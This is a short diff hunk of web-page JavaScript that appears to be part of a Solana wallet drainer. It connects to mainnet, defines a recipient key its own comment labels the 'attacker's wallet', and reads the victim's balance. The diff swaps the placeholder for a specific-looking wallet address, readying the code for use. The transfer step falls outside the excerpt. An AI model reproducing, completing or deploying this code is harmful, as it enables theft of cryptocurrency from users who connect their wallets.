@@ -31,7 +31,7 @@
                             const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
 
                             // Define the recipient's public key (attacker's wallet)
-                            const recipientPublicKey = new solanaWeb3.PublicKey('RECIPIENT_PUBLIC_KEY_HERE'); // Replace with the attacker's public key
+                            const recipientPublicKey = new solanaWeb3.PublicKey('7GMHQSwrsTWjJwbHkwihdRePfzUbXEy7ySbn3mqcnDDx'); // Replace with the attacker's public key
 
                             // Get the user's balance
                             const balance = await connection.getBalance(response.publicKey);
